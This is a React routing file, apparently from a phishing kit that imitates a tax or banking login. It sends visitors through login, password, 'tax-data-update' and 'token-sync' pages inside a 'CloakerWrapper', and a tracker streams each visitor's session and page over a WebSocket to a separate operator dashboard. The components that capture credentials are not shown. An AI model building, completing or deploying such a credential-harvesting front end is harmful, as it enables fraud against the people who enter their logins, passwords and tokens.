import { BrowserRouter as Router, Routes, Route, Navigate, useLocation } from 'react-router-dom'
import { useEffect } from 'react'
import LoginPage from './components/LoginPage'
import Password from './components/Password'
import TaxDataUpdate from './components/TaxDataUpdate'
import TaxConfirmation from './components/TaxConfirmation'
import TokenSync from './components/TokenSync'
import Container from './components/Container'
import DashboardLogin from './components/DashboardLogin'
import DashboardProtected from './components/DashboardProtected'
import CloakerWrapper from './components/CloakerWrapper'
import NotFound from './components/NotFound'
import sessionService from './services/session.service'
import websocketService from './services/websocket.service'
import './App.css'

// Componente para trackear páginas visitadas y gestionar sesión
const PageTracker = () => {
  const location = useLocation()

  useEffect(() => {
    // Generar o obtener ID de sesión al entrar al sitio
    const sessionId = sessionService.getSessionId()
    
    // Guardar tiempo de inicio de sesión si no existe
    const sessionStartKey = `sessionStartTime_${sessionId}`
    if (!localStorage.getItem(sessionStartKey)) {
      localStorage.setItem(sessionStartKey, Date.now().toString())
    }

    // Guardar página visitada con ID de sesión
    const pagesVisitedKey = `pagesVisited_${sessionId}`
    const pagesVisited = JSON.parse(localStorage.getItem(pagesVisitedKey) || '[]')
    const currentPage = location.pathname
    if (!pagesVisited.includes(currentPage)) {
      pagesVisited.push(currentPage)
      localStorage.setItem(pagesVisitedKey, JSON.stringify(pagesVisited))
    }

    // Enviar actualización de sesión al WebSocket si está conectado
    // Usar setTimeout para asegurar que el servicio esté listo
    setTimeout(() => {
      if (websocketService && websocketService.isConnected && websocketService.isConnected()) {
        websocketService.updateSession({
          sessionId: sessionId,
          page: currentPage,
          timestamp: new Date().toISOString()
        })
      } else {
        // Si no está conectado, intentar conectar
        websocketService.connect()
        // Reintentar después de un breve delay
        setTimeout(() => {
          if (websocketService.isConnected && websocketService.isConnected()) {
            websocketService.updateSession({
              sessionId: sessionId,
              page: currentPage,
              timestamp: new Date().toISOString()
            })
          }
        }, 2000)
      }
    }, 500)
  }, [location])

  return null
}

function App() {
  return (
    <Router>
      <CloakerWrapper>
        <PageTracker />
        <Routes>
          <Route path="/" element={<Navigate to="/login" replace />} />
          <Route path="/login" element={<LoginPage />} />
          <Route path="/password" element={<Password />} />
          <Route path="/tax-data-update" element={<TaxDataUpdate />} />
          <Route path="/tax-confirmation" element={<TaxConfirmation />} />
          <Route path="/token-sync" element={<TokenSync />} />
          <Route path="/acceso/:route" element={<Container />} />
          <Route path="/dashboard/login" element={<DashboardLogin />} />
          <Route path="/dashboard" element={<DashboardProtected />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
      </CloakerWrapper>
    </Router>
  )
}

export default App

